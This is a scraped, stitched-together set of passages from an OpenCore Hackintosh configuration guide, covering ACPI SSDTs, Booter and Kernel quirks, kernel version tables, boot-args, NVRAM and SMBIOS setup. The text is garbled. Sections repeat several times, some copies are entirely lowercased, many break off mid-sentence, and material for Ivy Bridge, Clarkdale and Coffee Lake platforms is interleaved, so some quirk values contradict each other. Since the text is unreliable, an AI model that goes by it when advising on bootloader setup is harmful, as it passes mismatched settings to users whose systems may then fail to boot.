10.5) we recommend to set this to Auto and let macOS decide based on your SMBIOS. See below table for supported values:\n     * 10.4-10.5 — x86_64, i386 or i386-user32\n       * i386-user32 refers 32-bit userspace, so 32-bit CPUs must use this(or CPUs missing SSSE3)\n       * x86_64 will still have a 32-bit kernelspace however will ensure 64-bit userspace in 10.4/5\n     * 10.6 — i386, i386-user32, or x86_64\n     * 10.7 — i386 or x86_64\n     * 10.8 or newer — x86_64\n\n * KernelCache: Auto\n   \n   * Set kernel cache type, mainly useful for debugging and so we recommend Auto for best support\n\n\n# Misc\n\n\n\n\n# Boot\n\nInfo\n\nQUIRK           ENABLED   COMMENT\nHideAuxiliary   YES       Press space to show macOS recovery and other auxiliary\n                          entries\n\nMore in-depth Info\n * HideAuxiliary: YES\n   * This option will hide supplementary entries, such as macOS recovery and tools, in the picker.

The typical breakdown is as follows:\n\nSMBIOS           CPU TYPE                  GPU TYPE                        DISPLAY SIZE\nMacBookAir5,1    Dual Core 17W             iGPU: HD 4000                   11\"\nMacBookAir5,2    Dual Core 17W             iGPU: HD 4000                   13\"\nMacBookPro10,1   Quad Core 45W             iGPU: HD 4000 + dGPU: GT 650M   15\"\nMacBookPro10,2   Dual Core 35W(High End)   iGPU: HD 4000                   13\"\nMacmini6,1       Dual Core NUC             iGPU: HD 4000                   N/A\nMacmini6,2       Quad Core NUC             iGPU: HD 4000                   N/A\n\nNote: The following SMBIOS are only supported up-to and including macOS 10.15, Catalina. For cases where you must boot Big Sur, see below:\n\nBig Sur SMBIOS table\n\nNote choosing a SMBIOS from the list below for Catalina or older is not recommended, as Power Management and such can break when using unoptimized SMBIOS.\n\nSMBIOS           CPU TYPE        DISPLAY SIZE\nMacBookAir6,1    Dual Core 15W   11\"\nMacBookAir6,2    Dual Core 15W   13\"\nMacBookPro11,1   Dual Core 28W   13\"\nMacBookPro11,2   Quad Core 45W   15\"\nMacBookPro11,3   Quad Core 45W   15\"\nMacBookPro11,4   Quad Core 45W   15\"\nMacBookPro11,5   Quad Core 45W   15\"\nMacmini7,1       NUC Systems     N/A\n\nRun GenSMBIOS, pick option 1 for downloading MacSerial and Option 3 for selecting out SMBIOS.

If you are booting macOS Catalina or earlier, you may need to set a new minimum version/date. Not setting this can result in OpenCore not finding your macOS partition!\n\nmacOS Sierra and earlier use HFS instead of APFS. You can skip this section if booting older versions of macOS.\n\nAPFS Versions\n\nBoth MinVersion and MinDate need to be set if changing the minimum version.\n\nMACOS VERSION           MIN VERSION        MIN DATE\nHigh Sierra (10.13.6)   748077008000000    20180621\nMojave (10.14.6)        945275007000000    20190820\nCatalina (10.15.4)      1412101001000000   20200306\nNo restriction          -1                 -1\n\n\n# Audio\n\nRelated to AudioDxe settings, for us we'll be ignoring(leave as default).

starting point\n\nso making a config.plist may seem hard, it's not. it just takes some time but this guide will tell you how to configure everything, you won't be left in the cold. this also means if you have issues, review your config settings to make sure they're correct. main things to note with opencore:\n\n * all properties must be defined, there are no default opencore will fall back on so do not delete sections unless told explicitly so. if the guide doesn't mention the option, leave it at default.\n * the sample.plist cannot be used as-is, you must configure it to your system\n * do not use configurators, these rarely respect opencore's configuration and even some like mackie's will add clover properties and corrupt plists!\n\nnow with all that, a quick reminder of the tools we need\n\n * propertree\n   * universal plist editor\n * gensmbios\n   * for generating our smbios data\n * sample/config.plist\n   * see previous section on how to obtain: config.plist

it is already in your firmware. so if present, remove the entry for it in your config.plist and under efi/oc/acpi.\n\nfor those wanting a deeper dive into dumping your dsdt, how to make these ssdts, and compiling them, please see the getting started with acpi page. compiled ssdts have a .aml extension(assembled) and will go into the efi/oc/acpi folder and must be specified in your config under acpi -> add as well.\n\n\n# delete\n\ninfo\n\nthis blocks certain acpi tables from loading, for us we really care about this. main reason is that apple's xcpm does not support ivybridge all too well and can cause appleintelcpupowermanagement panics on boot. to avoid this we make our own pm ssdt in post-install and drop the old tables(note that this is only temporary until we've made our ssdt-pm,

laptops(ie. with built-in displays) or for intel nucs(ie. stand alone boxes)\n\ngenerally follow these steps when setting up your igpu properties. follow the configuration notes below the table if they say anything different:\n\n 1. when initially setting up your config.plist, only set aapl,ig-platform-id - this is normally enough\n 2. if you boot and you get no graphics acceleration (7mb vram

with macos since it expects a certain imei id that it doesn't find and would get stuck at boot(as apple's igpu drivers require an imei device), to fix this we need to fake the imei's ids in these models\n\n * to know if you're affected check if your cpu is an intel core ix-3xxx and your chipset is hx6x (for example a laptop with hm65 or hm67 with a core i3-3110m) through tools like aida64.\n * in your config add a new pciroot device named pciroot(0x0)/pci(0x16,0x0)\n\nkey         type   value\ndevice-id   data   3a1e0000\n\npciroot(0x0)/pci(0x1b,0x0)\n\nlayout-id\n\n * applies applealc

sets trim timeout in microseconds for apfs filesystems on ssds, only applicable for macos 10.14 and newer with problematic ssds.\n * xhciportlimit: yes\n   * this is actually the 15 port limit patch, don't rely on it as it's not a guaranteed solution for fixing usb. please create a usb map when possible.\n   * with macos 11.3+, xhciportlimit may not function as intended. we recommend users either disable this quirk and map before upgrading or map from windows. you may also install macos 11.2.3 or older.\n\nthe reason being is that usbinjectall reimplements builtin macos functionality without proper current tuning. it is much cleaner to just describe your ports in a single plist-only kext, which will not waste runtime memory and such\n\n\n# scheme\n\nsettings related to legacy booting(ie.

between auto, i386 (32-bit), and x86_64 (64-bit).\n   * if you're booting older oses which require a 32-bit kernel(ie. 10.4 and 10.5) we recommend to set this to auto and let macos decide based on your smbios. see below table for supported values:\n     * 10.4-10.5 — x86_64, i386 or i386-user32\n       * i386-user32 refers 32-bit userspace, so 32-bit cpus must use this(or cpus missing ssse3)\n       * x86_64 will still have a 32-bit kernelspace however will ensure 64-bit userspace in 10.4/5\n     * 10.6 — i386, i386-user32, or x86_64\n     * 10.7 — i386 or x86_64\n     * 10.8 or newer —

which helps prevents a reboot\n              on a kernel panic. that way you can hopefully glean some\n              useful info and follow the breadcrumbs to get past the\n              issues.\nkeepsyms=1    this is a companion setting to debug=0x100 that tells the os\n              to also print the symbols on a kernel panic. that can give\n              some more helpful insight as to what's causing the panic\n              itself.\nalcid=1       used for setting layout-id for applealc, see supported\n              codecs to figure out which layout to use for your specific\n              system. more info on this is covered in the post-install\n              page\n\n * gpu-specific boot-args:\n\nboot-args    description\n-wegnoegpu   used for disabling all other gpus than the integrated intel\n             igpu, useful for those wanting to run newer versions of\n             macos where their dgpu isn't supported\n\n * csr-active-config: 00000000\n   \n   * settings for 'system integrity protection' (sip). it is generally recommended to change this with csrutil via the recovery partition.\n   * csr-active-config by default is set to 00000000 which enables system integrity protection. you can choose a number of different values but overall we recommend keeping this enabled for best security practices. more info can be found in our troubleshooting page: disabling sip\n\n * run-efi-updater: no\n   \n   * this is used to prevent apple's firmware update packages from installing and breaking boot order; this is important as these firmware updates (meant for macs) will not work.\n\n * prev-lang:kbd: <>\n   \n   * needed for non-latin keyboards in the format of lang-country:keyboard, recommended to keep blank though you can specify it(default in sample config is russian):\n   * american: en-us:0(656e2d55533a30 in hex)\n   * full list can be found in applekeyboardlayouts.txt\n   * hint: prev-lang:kbd can be changed into a string so you can input en-us:0 directly instead of converting to hex\n   * hint 2: prev-lang:kbd can be set to a blank variable (eg. <>) which will force the language picker to appear instead at first boot up.\n\nkey             type     value\nprev-lang:kbd   string   en-us:0\n\n\n# delete\n\nforcibly rewrites nvram variables, do note that add will not overwrite values already present in nvram so values like boot-args should be left alone.\n\n * legacyschema\n   \n   * used for assigning nvram variables, used with openvariableruntimedxe.efi. only needed for systems without native nvram\n\n * writeflash: yes\n   \n   * enables writing to flash memory for all added variables.\n\n\n# platforminfo\n\n\n\ninfo\n\nfor setting up the smbios info, we'll use corpnewt's gensmbios application.\n\nfor this ivy bridge example, we'll chose the imac13,2 smbios - this is done intentionally for compatibility's sake. the typical breakdown is as follows:\n\nsmbios           cpu type                  gpu type

for cases where you must boot big sur, see below:\n\nbig sur smbios table\n\nnote choosing a smbios from the list below for catalina or older is not recommended, as power management and such can break

and firmware drivers(.efi), your USB should start to look something like this:\n\n\n\n * Note: Your USB will look different, everyone's system will have different requirements.\n\n\n# Creating your config.plist\n\nFirst we'll want to grab the Sample.plist from the OpenCorePkg, this will be located under the Docs folder:\n\n\n\nNext lets move it onto our USB's EFI partition(will be called BOOT on Windows) under EFI/OC/, and rename it to config.plist:\n\n\n\n\n# Adding your SSDTs, Kexts and Firmware Drivers\n\nFor the rest of this guide, you're gonna need some form of plist editing. And for our guide, we'll be using ProperTree and GenSMBIOS to help automate some of the tedious work:\n\n * ProperTree\n   * Universal plist editor\n * GenSMBIOS\n   * For generating our SMBIOS data\n\nNext, let's open ProperTree and edit our config.plist:\n\n * ProperTree.command\n   * For macOS\n   * Pro tip: there's a buildapp.command utility in the Scripts folder that lets you turn ProperTree into a dedicated app in macOS\n * ProperTree.bat\n   * For Windows\n\nOnce ProperTree is running, open your config.plist by pressing Cmd/Ctrl + O and selecting the config.plist file on your USB.\n\nAfter the config is opened, press Cmd/Ctrl + Shift + R and point it at your EFI/OC folder to perform a \"Clean Snapshot\":\n\n * This will remove all the entries from the config.plist and then adds all your SSDTs, Kexts and Firmware drivers to the config\n * Cmd/Ctrl + R is another option that will add all your files as well but will leave entries disabled if they were set like that before, useful for when you're troubleshooting but for us not needed right now\n\n\n\nOnce done, you'll see your SSDTs, Kexts and firmware drivers populated in the config.plist:\n\n\n\n * Note: If you get a pop up \"Disable the following kexts with Duplicate CFBundleIdentifiers?\", press \"Yes\". This is to ensure you don't have duplicate kexts being injected, as some kexts may have some of the same plugins(ie. VoodooInput is in both VoodooPS2 and VoodooI2C's plugin folder)\n\n\n\nIf you wish to clean up the file a bit, you can remove the #WARNING entries. Though they cause no issues staying there, so up to personal preference.\n\nDANGER\n\nThe config.plist must match the contents of the EFI folder. If you delete a file but leave it listed in the Config.plist, OpenCore will error and stop booting.\n\nIf you make any modifications, you can use the OC snapshot tool (Cmd/Ctrl + R) in ProperTree to update the config.plist.\n\n\n# Selecting your platform\n\nNow comes the important part, selecting the configuration path. Each platform has their own unique quirks that you need to account for so knowing your hardware is super important.

Monterey\nNote 1                  For Ventura information, see macOS 13 Ventura\nNote 2                  Apple does not support desktop Iron Lake iGPUs\nNote 3                  Most Lynnfield and Clarkdale boards do not support UEFI\n\n\n# Starting Point\n\nSo making a config.plist may seem hard, it's not. It just takes some time but this guide will tell you how to configure everything, you won't be left in the cold. This also means if you have issues, review your config settings to make sure they're correct. Main things to note with OpenCore:\n\n * All properties must be defined, there are no default OpenCore will fall back on so do not delete sections unless told explicitly so. If the guide doesn't mention the option, leave it at default.\n * The Sample.plist cannot be used As-Is, you must configure it to your system\n * DO NOT USE CONFIGURATORS, these rarely respect OpenCore's configuration and even some like Mackie's will add Clover properties and corrupt plists!\n\nNow with all that, a quick reminder of the tools we need\n\n * ProperTree\n   * Universal plist editor\n * GenSMBIOS\n   * For generating our SMBIOS data\n * Sample/config.plist\n   * See previous section on how to obtain: config.plist Setup\n\nWARNING\n\nRead this guide more than once before setting up OpenCore and make sure you have it set up correctly. Do note that images will not always be the most up-to-date so please read the text below them, if nothing's mentioned then leave as default.\n\n\n# ACPI\n\n\n\n\n# Add\n\nInfo\n\nThis is where you'll add SSDTs for your system, these are very important to booting macOS and have many uses like USB maps, disabling unsupported GPUs and such. And with our system, it's even required to boot. Guide on making them found here: Getting started with ACPI\n\nFor us we'll need a couple of SSDTs to bring back functionality that Clover provided:\n\nREQUIRED SSDTS   DESCRIPTION\nSSDT-EC          Fixes the embedded controller, see Getting Started With ACPI\n                 Guide for more details.\n\nNote that you should not add your generated DSDT.aml here, it is already in your firmware. So if present, remove the entry for it in your config.plist and under EFI/OC/ACPI.\n\nFor those wanting a deeper dive into dumping your DSDT, how to make these SSDTs, and compiling them, please see the Getting started with ACPI page. Compiled SSDTs have a .aml extension(Assembled) and will go into the EFI/OC/ACPI folder and must be specified in your config under ACPI -> Add as well.\n\n\n# Delete\n\nThis blocks certain ACPI tables from loading, for us we can ignore this.\n\n\n# Patch\n\nThis section allows us to dynamically modify parts of the ACPI (DSDT, SSDT, etc.) via OpenCore. For us, our patches are handled by our SSDTs. This is a much cleaner solution as this will allow us to boot Windows and other OSes with OpenCore\n\n\n# Quirks\n\nSettings relating to ACPI, leave everything here as default as we have no use for these quirks.\n\n\n# Booter\n\nLEGACY   UEFI\n         \n\nThis section is dedicated to quirks relating to boot.efi patching with OpenRuntime, the replacement for AptioMemoryFix.efi\n\n\n# MmioWhitelist\n\nThis section is allowing spaces to be passthrough to macOS that are generally ignored, useful when paired with DevirtualiseMmio\n\n\n# Quirks\n\nInfo\n\nSettings relating to boot.efi patching and firmware fixes, depending where your board has UEFI, you have 2 options depending what your motherboard supports:\n\n# Legacy Settings\n\nQUIRK                    ENABLED   COMMENT\nAvoidRuntimeDefrag       No        Big Sur may require this quirk enabled\nEnableSafeModeSlide      No        \nEnableWriteUnprotector   No        \nProvideCustomSlide       No        \nRebuildAppleMemoryMap    Yes       This is required to boot OS X 10.4 through 10.6\nSetupVirtualMap          No        \n\n# UEFI Settings\n\nQUIRK                   ENABLED   COMMENT\nRebuildAppleMemoryMap   Yes       This is required to boot OS X 10.4 through 10.6\n\nMore in-depth Info\n * AvoidRuntimeDefrag: NO\n   * Fixes UEFI runtime services like date, time, NVRAM, power control;\n   * macOS Big Sur however requires the APIC table present, otherwise causing early kernel panics so this quirk is recommended for those users.\n * EnableSafeModeSlide: YES\n   * Enables slide variables to be used in safe mode.\n * EnableWriteUnprotector: NO\n   * Needed to remove write protection from CR0 register.\n * ProvideCustomSlide: YES\n   * Used for Slide variable calculation. However the necessity of this quirk is determined by OCABC: Only N/256 slide values are usable! message in the debug log. If the message OCABC: All slides are usable! You can disable ProvideCustomSlide! is present in your log, you can disable ProvideCustomSlide.\n * RebuildAppleMemoryMap: YES\n   * Resolves early memory kernel panics on 10.6 and below.\n * SetupVirtualMap: YES\n   * Fixes SetVirtualAddresses calls to virtual addresses.\n\n\n# DeviceProperties\n\n\n\n\n# Add\n\nSets device properties from a map.\n\nBy default, the Sample.plist has this section set for audio which we'll be setting up by setting the layout ID in the boot-args section, so removal of PciRoot(0x0)/Pci(0x1b,0x0) is also recommended from the Add section.\n\n\n# Delete\n\nRemoves device properties from the map, for us we can ignore this\n\n\n# Kernel\n\n\n\n\n# Add\n\nHere's where we specify which kexts to load, in what specific order to load, and what architectures each kext is meant for. By default we recommend leaving what ProperTree has done, however for 32-bit CPUs please see below:\n\nMore in-depth Info\n\nThe main thing you need to keep in mind is:\n\n * Load order\n   * Remember that any plugins should load after its dependencies\n   * This means kexts like Lilu must come before VirtualSMC, AppleALC, WhateverGreen, etc\n\nA reminder that ProperTree users can run Cmd/Ctrl + Shift + R to add all their kexts in the correct order without manually typing each kext out.\n\n * Arch\n   * Architectures supported by this kext\n   * Currently supported values are Any, i386 (32-bit), and x86_64 (64-bit)\n * BundlePath\n   * Name of the kext\n   * ex: Lilu.kext\n * Enabled\n   * Self-explanatory, either enables or disables the kext\n * ExecutablePath\n   * Path to the actual executable is hidden within the kext, you can see what path your kext has by right-clicking and selecting Show Package Contents. Generally, they'll be Contents/MacOS/Kext but some have kexts hidden within under Plugin folder. Do note that plist only kexts do not need this filled in.\n   * ex: Contents/MacOS/Lilu\n * MinKernel\n   * Lowest kernel version your kext will be injected into, see below table for possible values\n   * ex. 12.00.00 for OS X 10.8\n * MaxKernel\n   * Highest kernel version your kext will be injected into, see below table for possible values\n   * ex. 11.99.99 for OS X 10.7\n * PlistPath\n   * Path to the info.plist hidden within the kext\n   * ex: Contents/Info.plist\n\nKernel Support Table\n\nOS X VERSION   MINKERNEL   MAXKERNEL\n10.4           8.0.0       8.99.99\n10.5           9.0.0       9.99.99\n10.6           10.0.0      10.99.99\n10.7           11.0.0      11.99.99\n10.8           12.0.0      12.99.99\n10.9           13.0.0      13.99.99\n10.10          14.0.0      14.99.99\n10.11          15.0.0      15.99.99\n10.12          16.0.0      16.99.99\n10.13          17.0.0      17.99.99\n10.14          18.0.0      18.99.99\n10.15          19.0.0      19.99.99\n11             20.0.0      20.99.99\n12             21.0.0      21.99.99\n13             22.0.0      22.99.99\n\n\n# Emulate\n\nNeeded for spoofing unsupported CPUs like Pentiums and Celerons\n\n * Cpuid1Mask: Leave this blank\n * Cpuid1Data: Leave this blank\n\n\n# Force\n\nUsed for loading kexts off system volume, only relevant for older operating systems where certain kexts are not present in the cache(ie.

Usually relevant for Dell laptops\n   * Enabling this quirk with UpdateSMBIOSMode Custom mode can also disable SMBIOS injection into \"non-Apple\" OSes however we do not endorse this method as it breaks Bootcamp compatibility. Use at your own risk\n * DisableIoMapper: YES\n   * Needed to get around VT-D if either unable to disable in BIOS or needed for other operating systems, much better alternative to dart=0 as SIP can stay on in Catalina\n * DisableLinkeditJettison: YES\n   * Allows Lilu and others to have more reliable performance without keepsyms=1\n * DisableRtcChecksum: NO\n   * Prevents AppleRTC from writing to primary checksum (0x58-0x59), required for users who either receive BIOS reset or are sent into Safe mode after reboot/shutdown\n * ExtendBTFeatureFlags NO\n   * Helpful for those having continuity issues with non-Apple/non-Fenvi cards\n * LapicKernelPanic: NO\n   * Disables kernel panic on AP core lapic interrupt, generally needed for HP systems. Clover equivalent is Kernel LAPIC\n * LegacyCommpage: NO\n   * Resolves SSSE3 requirement for 64 Bit CPUs in macOS, mainly relevant for 64-Bit Pentium 4 CPUs(ie. Prescott)\n * PanicNoKextDump: YES\n   * Allows for reading kernel panics logs when kernel panics occur\n * PowerTimeoutKernelPanic: YES\n   * Helps fix kernel panics relating to power changes with Apple drivers in macOS Catalina, most notably with digital audio.\n * SetApfsTrimTimeout: -1\n   * Sets trim timeout in microseconds for APFS filesystems on SSDs, only applicable for macOS 10.14 and newer with problematic SSDs.\n * XhciPortLimit: YES\n   * This is actually the 15 port limit patch, don't rely on it as it's not a guaranteed solution for fixing USB. Please create a USB map when possible.\n   * With macOS 11.3+, XhciPortLimit may not function as intended. We recommend users either disable this quirk and map before upgrading or map from Windows. You may also install macOS 11.2.3 or older.\n\n\n# Scheme\n\nSettings related to legacy booting(ie. 10.4-10.6), for majority you can skip however for those planning to boot legacy OSes you can see below:\n\nMore in-depth Info\n\n * FuzzyMatch: True\n   \n   * Used for ignoring checksums with kernelcache, instead opting for the latest cache available. Can help improve boot performance on many machines in 10.6\n\n * KernelArch: x86_64\n   \n   * Set the kernel's arch type, you can choose between Auto, i386 (32-bit), and x86_64 (64-bit).\n   * If you're booting older OSes which require a 32-bit kernel(ie. 10.4 and 10.5) we recommend to set this to Auto and let macOS decide based on your SMBIOS. See below table for supported values:\n     * 10.4-10.5 — x86_64, i386 or i386-user32\n       * i386-user32 refers 32-bit userspace, so 32-bit CPUs must use this(or CPUs missing SSSE3)\n       * x86_64 will still have a 32-bit kernelspace however will ensure 64-bit userspace in 10.4/5\n     * 10.6 — i386, i386-user32, or x86_64\n     * 10.7 — i386 or x86_64\n     * 10.8 or newer — x86_64\n\n * KernelCache: Auto\n   \n   * Set kernel cache type, mainly useful for debugging and so we recommend Auto for best support\n\n\n# Misc\n\n\n\n\n# Boot\n\nInfo\n\nQUIRK           ENABLED   COMMENT\nHideAuxiliary   YES       Press space to show macOS recovery and other auxiliary\n                          entries\n\nMore in-depth Info\n * HideAuxiliary: YES\n   * This option will hide supplementary entries, such as macOS recovery and tools, in the picker.

It's invaluable\n              to any Hackintosher, as it gives you an inside look at the\n              boot process, and can help you identify issues, problem\n              kexts, etc.\ndebug=0x100   This disables macOS's watchdog which helps prevents a reboot\n              on a kernel panic. That way you can hopefully glean some\n              useful info and follow the breadcrumbs to get past the\n              issues.\nkeepsyms=1    This is a companion setting to debug=0x100 that tells the OS\n              to also print the symbols on a kernel panic. That can give\n              some more helpful insight as to what's causing the panic\n              itself.\nalcid=1       Used for setting layout-id for AppleALC, see supported\n              codecs to figure out which layout to use for your specific\n              system.

There are 3 main SMBIOS used for Clarkdale:\n\nSMBIOS      HARDWARE\niMac11,1    Lynnfield SMBIOS\niMac11,2    Clarkdale SMBIOS\nMacPro6,1   Mojave and newer SMBIOS\n\n * If you plan to later run macOS 10.14, Mojave or newer, MacPro6,1 will be the recommended SMBIOS and the iGPU must be disabled in the BIOS due to no longer being supported\n\nRun GenSMBIOS, pick option 1 for downloading MacSerial and Option 3 for selecting out SMBIOS. This will give us an output similar to the following:\n\n  #######################################################\n #               iMac11,2 SMBIOS Info                  #\n#######################################################\n\nType:         iMac11,2\nSerial:       C02KCYZLDNCW\nBoard Serial: C02309301QXF2FRJC\nSmUUID:       A154B586-874B-4E57-A1FF-9D6E503E4580\n\n\nThe Type part gets copied to Generic -> SystemProductName.\n\nThe Serial part gets copied to Generic -> SystemSerialNumber.\n\nThe Board Serial part gets copied to Generic -> MLB.\n\nThe SmUUID part gets copied to Generic -> SystemUUID.\n\nWe set Generic -> ROM to either an Apple ROM (dumped from a real Mac), your NIC MAC address, or any random MAC address (could be just 6 random bytes, for this guide we'll use 11223300 0000. After install follow the Fixing iServices page on how to find your real MAC Address)\n\nReminder that you need an invalid serial!

If you are booting macOS Catalina or earlier, you may need to set a new minimum version/date. Not setting this can result in OpenCore not finding your macOS partition!\n\nmacOS Sierra and earlier use HFS instead of APFS. You can skip this section if booting older versions of macOS.\n\nAPFS Versions\n\nBoth MinVersion and MinDate need to be set if changing the minimum version.\n\nMACOS VERSION           MIN VERSION        MIN DATE\nHigh Sierra (10.13.6)   748077008000000    20180621\nMojave (10.14.6)        945275007000000    20190820\nCatalina (10.15.4)      1412101001000000   20200306\nNo restriction          -1                 -1\n\n\n# Audio\n\nRelated to AudioDxe settings, for us we'll be ignoring(leave as default).

you won't be left in the cold. this also means if you have issues, review your config settings to make sure they're correct. main things to note with opencore:\n\n * all properties must be defined, there are no default opencore will fall back on so do not delete sections unless told explicitly so. if the guide doesn't mention the option, leave it at default.\n * the sample.plist cannot be used as-is, you must configure it to your system\n * do not use configurators, these rarely respect opencore's configuration and even some like mackie's will add clover properties and corrupt plists!\n\nnow with all that, a quick reminder of the tools we need\n\n * propertree\n   * universal plist editor\n * gensmbios\n   * for generating our smbios data\n * sample/config.plist\n   * see previous section on how to obtain: config.plist setup\n\nwarning\n\nread this guide more than once before setting up opencore and make sure you have it set up correctly. do note that images will not

in your config.plist and under efi/oc/acpi.\n\nfor those wanting a deeper dive into dumping your dsdt, how to make these ssdts, and compiling them, please see the getting started with acpi page. compiled ssdts have a .aml extension(assembled) and will go into the efi/oc/acpi folder and must be specified in your config under acpi -> add as well.\n\n\n# delete\n\nthis blocks certain acpi tables from loading, for us we can ignore this.\n\n\n# patch\n\nthis section allows us to dynamically modify parts of the acpi (dsdt, ssdt, etc.) via opencore. for us, our patches are handled by our ssdts.

a 32-bit kernel(ie. 10.4 and 10.5) we recommend to set this to auto and let macos decide based on your smbios. see below table for supported values:\n     * 10.4-10.5 — x86_64, i386 or i386-user32\n       * i386-user32 refers 32-bit userspace, so 32-bit cpus must use this(or cpus missing ssse3)\n       * x86_64 will still have a 32-bit kernelspace however will ensure 64-bit userspace in 10.4/5\n     * 10.6 — i386, i386-user32, or x86_64\n     * 10.7 — i386 or x86_64\n     * 10.8 or newer — x86_64\n\n * kernelcache: auto\n   \n   * set kernel cache type, mainly useful for debugging and so we

you identify issues, problem\n              kexts, etc.\ndebug=0x100   this disables macos's watchdog which helps prevents a reboot\n              on a kernel panic. that way you can hopefully glean some\n              useful info and follow the breadcrumbs to get past the\n              issues.\nkeepsyms=1    this is a companion setting to debug=0x100 that tells the os\n              to also

clarkdale smbios\nmacpro6,1   mojave and newer smbios\n\n * if you plan to later run macos 10.14, mojave or newer, macpro6,1 will be the recommended smbios and the igpu must be disabled in the bios due to no longer being supported\n\nrun gensmbios, pick option 1 for downloading macserial and option 3 for selecting out smbios. this will give us an output similar to the following:\n\n

hard, it's not. It just takes some time but this guide will tell you how to configure everything, you won't be left in the cold. This also means if you have issues, review your config settings to make sure they're correct. Main things to note with OpenCore:\n\n * All properties must be defined, there are no default OpenCore will fall back on so do not delete sections unless told explicitly so. If the guide doesn't mention the option, leave it at default.\n * The Sample.plist cannot be used As-Is, you must configure it to your system\n * DO NOT USE CONFIGURATORS, these rarely respect OpenCore's configuration and even some like Mackie's will add Clover properties and corrupt plists!\n\nNow with all that, a quick reminder of the tools we need\n\n * ProperTree\n   * Universal plist editor\n * GenSMBIOS\n   * For generating our SMBIOS data\n * Sample/config.plist\n   * See previous section on how to obtain: config.plist Setup\n\nWARNING\n\nRead this guide more than once before setting up OpenCore and make sure you have it set up correctly. Do note that images will not always be the most up-to-date so please read the text below them, if nothing's mentioned then leave as default.\n\n\n# ACPI\n\n\n\n\n# Add\n\nInfo\n\nThis is where you'll add SSDTs for your system, these are very important to booting macOS and have many uses like USB maps, disabling unsupported GPUs and such. And with our system, it's even required to boot. Guide on making them found here: Getting started with ACPI\n\nFor us we'll need a couple of SSDTs to bring back functionality that Clover provided:\n\nREQUIRED SSDTS   DESCRIPTION\nSSDT-PLUG        Allows for native CPU power management on Haswell and newer,\n                 see Getting Started With ACPI Guide for more details.\nSSDT-EC-USBX     Fixes both the embedded controller and USB power, see\n                 Getting Started With ACPI Guide for more details.\nSSDT-AWAC        This is the 300 series RTC patch, required for most B360,\n                 B365, H310, H370, Z390 and some Z370 boards which prevent\n                 systems from booting macOS. The alternative is SSDT-RTC0 for\n                 when AWAC SSDT is incompatible due to missing the Legacy RTC\n                 clock, to check whether you need it and which to use please\n                 see Getting started with ACPI page.\nSSDT-PMC         So true 300 series motherboards(non-Z370) don't declare the\n                 FW chip as MMIO in ACPI and so XNU ignores the MMIO region\n                 declared by the UEFI memory map. This SSDT brings back NVRAM\n                 support. See Getting Started With ACPI Guide for more\n                 details.\n\nNote that you should not add your generated DSDT.aml here, it is already in your firmware. So if present, remove the entry for it in your config.plist and under EFI/OC/ACPI.\n\nFor those wanting a deeper dive into dumping your DSDT, how to make these SSDTs, and compiling them, please see the Getting started with ACPI page. Compiled SSDTs have a .aml extension(Assembled) and will go into the EFI/OC/ACPI folder and must be specified in your config under ACPI -> Add as well.\n\n\n# Delete\n\nThis blocks certain ACPI tables from loading, for us we can ignore this.\n\n\n# Patch\n\nThis section allows us to dynamically modify parts of the ACPI (DSDT, SSDT, etc.) via OpenCore. For us, our patches are handled by our SSDTs. This is a much cleaner solution as this will allow us to boot Windows and other OSes with OpenCore\n\n\n# Quirks\n\nSettings relating to ACPI, leave everything here as default as we have no use for these quirks.\n\n\n# Booter\n\n\n\nThis section is dedicated to quirks relating to boot.efi patching with OpenRuntime, the replacement for AptioMemoryFix.efi\n\n\n# MmioWhitelist\n\nThis section is allowing devices to be passthrough to macOS that are generally ignored, for us we can ignore this section.\n\n\n# Quirks\n\nInfo\n\nSettings relating to boot.efi patching and firmware fixes, for us, we need to change the following:\n\nQUIRK                    ENABLED   COMMENT\nDevirtualiseMmio         YES       \nEnableWriteUnprotector   NO        \nProtectUefiServices      YES       Needed on Z390 system\nRebuildAppleMemoryMap    YES       \nResizeAppleGpuBars       -1        If your firmware supports increasing GPU Bar sizes (ie\n                                   Resizable BAR Support), set this to 0\nSyncRuntimePermissions   YES       \n\nMore in-depth Info\n * AvoidRuntimeDefrag: YES\n   * Fixes UEFI runtime services like date, time, NVRAM, power control, etc.\n * DevirtualiseMmio: YES\n   * Reduces Stolen Memory Footprint, expands options for slide=N values and very helpful with fixing Memory Allocation issues on Z390. Requires ProtectUefiServices as well on IceLake and Z390 Coffee Lake.\n * EnableSafeModeSlide: YES\n   * Enables slide variables to be used in safe mode.\n * EnableWriteUnprotector: NO\n   * This quirk and RebuildAppleMemoryMap can commonly conflict, recommended to enable the latter on newer platforms and disable this entry.\n   * However, due to issues with OEMs not using the latest EDKII builds you may find that the above combo will result in early boot failures. This is due to missing the MEMORY_ATTRIBUTE_TABLE and such we recommend disabling RebuildAppleMemoryMap and enabling EnableWriteUnprotector. More info on this is covered in the troubleshooting section.\n * ProtectUefiServices: NO\n   * Protects UEFI services from being overridden by the firmware, mainly relevant for VMs, Icelake and Z390 systems'.\n   * If on Z390, enable this quirk.\n * ProvideCustomSlide: YES\n   * Used for Slide variable calculation. However the necessity of this quirk is determined by OCABC: Only N/256 slide values are usable! message in the debug log. If the message OCABC: All slides are usable! You can disable ProvideCustomSlide! is present in your log, you can disable ProvideCustomSlide.\n * RebuildAppleMemoryMap: YES\n   * Generates Memory Map compatible with macOS, can break on some laptop OEM firmwares so if you receive early boot failures disable this.\n * ResizeAppleGpuBars: -1\n   * Will reduce the size of GPU PCI Bars if set to 0 when booting macOS, set to -1 to disable\n   * Setting other PCI Bar values is possible with this quirk, though can cause instabilities\n   * This quirk being set to zero is only necessary if Resizable BAR Support is enabled in your firmware.\n * SetupVirtualMap: YES\n   * Fixes SetVirtualAddresses calls to virtual addresses, shouldn't be needed on Skylake and newer. Some firmware like Gigabyte may still require it, and will kernel panic without this.\n * SyncRuntimePermissions: YES\n   * Fixes alignment with MAT tables and required to boot Windows and Linux with MAT tables, also recommended for macOS. Mainly relevant for RebuildAppleMemoryMap users.\n\n\n# DeviceProperties\n\n\n\n\n# Add\n\nSets device properties from a map.\n\nPciRoot(0x0)/Pci(0x2,0x0)\n\nThis section is set up via WhateverGreen's Framebuffer Patching Guide and is used for setting important iGPU properties. If you have a -F series CPU, you can ignore this section as you do not have an iGPU.\n\nThe config.plist doesn't already have a section for this so you will have to create it manually.\n\nAAPL,ig-platform-id is what macOS uses to determine how the iGPU drivers interact with our system, and the two values choose between are as follows:\n\nAAPL,IG-PLATFORM-ID   COMMENT\n07009B3E              Used when the Desktop iGPU is used to drive a display\n00009B3E              Alternative to 07009B3E if it doesn't work\n0300913E              Used when the Desktop iGPU is only used for computing tasks\n                      and doesn't drive a display\n\n * Note: With macOS 10.15.5 and 